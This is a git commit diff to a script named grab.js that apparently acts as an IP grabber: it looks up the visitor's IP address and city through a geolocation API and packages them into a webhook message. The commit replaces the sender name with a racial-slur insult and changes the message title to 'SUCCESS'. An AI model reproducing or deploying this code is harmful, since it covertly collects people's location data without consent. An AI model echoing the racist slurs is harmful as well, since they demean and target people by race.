72f49cf305ef3a0112486c54671bfd83a44a25c1
EvaNygrenVasaborgen <elias_nygren@icloud.com>
2025-02-04 14:35:36 +0100

    Update grab.js

--- grab.js
+++ grab.js
@@ -5,12 +5,12 @@ $.getJSON("https://ipgeolocation.abstractapi.com/v1/?api_key=fa1a2f8df62745e3bb7
     request.setRequestHeader('Content-type', 'application/json');
   
     var t = {
-      username: "GrabUrMom",
+      username: "FUCK YOU NIGGER NIGER NIGGER",
       avatar_url: "https://previews.123rf.com/images/geotrac/geotrac1401/geotrac140100113/25298075-beautiful-hispanic-soccer-mom.jpg",
       content: "",
       embeds: [{
           color: "4700374",
-          title: "YOU GOT INFO",
+          title: "SUCCESS",
           fields: [
             {name: "IP", value: data.ip_address},
             {name: "CITY", value: data.city},
